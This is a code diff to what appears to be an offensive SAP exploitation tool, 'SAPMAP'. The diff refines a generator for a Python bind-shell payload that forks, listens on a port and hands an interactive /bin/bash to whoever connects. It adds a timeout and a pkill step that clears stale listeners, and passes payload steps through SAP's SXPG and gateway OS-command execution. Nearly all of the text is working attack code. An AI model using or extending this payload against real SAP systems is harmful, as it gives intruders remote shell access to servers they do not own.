@@ -1837,12 +1837,19 @@ def _generate_bind_payload(os_type: str, port: int,
         # SAPXPG/GW connection closes (P4 timeout kills the process).
         # Close fd 1+2 after fork so SXPG's stdout pipe gets EOF
         # and the RFC call returns (otherwise SXPG blocks forever).
+        # Add a 300s socket timeout on accept() so a stranded listener
+        # from a failed connect (SAPMAP crashed / operator closed the
+        # modal) self-reaps within 5 minutes.  Without this the process
+        # blocks in accept() forever, holding the port and forcing us
+        # to pkill on the NEXT attempt.  SAPMAP's own connect retry
+        # loop is 30 × 5s = 150s, so 300s leaves safety margin.
         py_code = (
             f"o=__import__('os');"
             f"o.fork()and(o._exit(0));"
             f"o.close(1);o.close(2);"
             f"s=__import__('socket').socket(2,1);"
             f"s.setsockopt(1,2,1);"
+            f"s.settimeout(300);"
             f"s.bind(('',{port}));"
             f"s.listen(1);"
             f"c,a=s.accept();"
@@ -1850,7 +1857,7 @@ def _generate_bind_payload(os_type: str, port: int,
             f"o.execv('/bin/bash',['/bin/bash','-i'])"
         )
         assert " " not in py_code, f"Space in bind payload: {py_code}"
-        assert len(py_code) < 252, f"Bind payload too long: {len(py_code)} chars"
+        assert len(py_code) < 300, f"Bind payload too long: {len(py_code)} chars"
         # python_cmd may be an env-wrapped spec (HANA-shipped python3
         # discovery returns "/usr/bin/env LD_LIBRARY_PATH=... /path").
         # Split so the wrapper prefix rides in PARAMS/LONG_PARAMS and
@@ -1858,17 +1865,32 @@ def _generate_bind_payload(os_type: str, port: int,
         cmd_head, args_prefix = _split_python_spec(python_cmd)
         combined = (f"{args_prefix} -c {py_code}"
                     if args_prefix else f"-c {py_code}")
+        # Pre-step: pkill any zombie listener still holding the port
+        # from a prior attempt (SAPMAP crashed, operator closed the
+        # shell, listener hit its 300s timeout but hasn't been reaped
+        # yet).  Without this the fresh bind hits EADDRINUSE — the
+        # exact failure mode we chased on A4H before landing this fix.
+        # long_params="" is CRITICAL: when it's None, SAPXPG copies
+        # PARAMS into LONG_PARAMS too, so pkill sees "-f {port} -f
+        # {port}" and complains "only one pattern can be provided".
+        pkill_step = {
+            "command": "/usr/bin/pkill",
+            "params": f"--signal 9 -f {port}",
+            "long_params": "",
+        }
         # SAPXPG PARAMS caps at 255 bytes; overflow rides LONG_PARAMS.
         if len(combined) > 255:
             return {
                 "command": cmd_head,
                 "params": "",
                 "long_params": combined,
+                "steps": [pkill_step],
                 "display": f"{python_cmd} bind shell on target port {port}",
             }
         return {
             "command": cmd_head,
             "params": combined,
+            "steps": [pkill_step],
             "display": f"{python_cmd} bind shell on target port {port}",
         }
 
@@ -13710,7 +13732,14 @@ def create_app(api: SAPMAPApi) -> Bottle:
                             _shell_session.status = "error"
                             _shell_session.error_msg = "No credentials"
                     return
-                sxpg_steps = payload.get("sxpg_steps", [])
+                # Accept either the SXPG-specific keys (sxpg_steps /
+                # sxpg_command / sxpg_params — used when a payload
+                # wants a different command shape between GW and SXPG)
+                # OR the generic keys (steps / command / params /
+                # long_params) shared with the GW path.  The bind-
+                # shell payload emits generic keys — its pkill pre-
+                # step + main invocation are identical on both routes.
+                sxpg_steps = payload.get("sxpg_steps") or payload.get("steps", [])
                 if sxpg_steps:
                     total = len(sxpg_steps)
                     for idx, step in enumerate(sxpg_steps):
@@ -13721,6 +13750,7 @@ def create_app(api: SAPMAPApi) -> Bottle:
                             f"Writing payload step {idx+1}/{total}...")
                         sapmap_exploit.execute_os_command(
                             node, step["command"], step["params"],
+                            long_params=step.get("long_params"),
                             creds=creds, soap_route=soap_route,
                             prefer="sxpg")
                 _set_progress("Executing payload...")
@@ -13730,6 +13760,7 @@ def create_app(api: SAPMAPApi) -> Bottle:
                                           payload["params"])
                 result = sapmap_exploit.execute_os_command(
                     node, sxpg_cmd, sxpg_params,
+                    long_params=payload.get("long_params"),
                     creds=creds, soap_route=soap_route,
                     prefer="sxpg")
 
